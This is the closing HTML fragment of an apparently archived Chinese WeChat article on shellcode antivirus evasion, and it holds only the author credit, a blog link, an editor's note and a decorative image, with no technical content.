!important;width: 640px !important;"  /></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">原创投稿作者：卿</span></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">作者博客：</span><span style="font-size:12px;line-height:32px;;">https://www.cnblogs.com/-qing-/</span></p><p style="white-space: normal;text-align: right;"><span style="font-size:12px;line-height:32px;;">本文由公众号HACK学习排版编辑整理</span></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/7_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>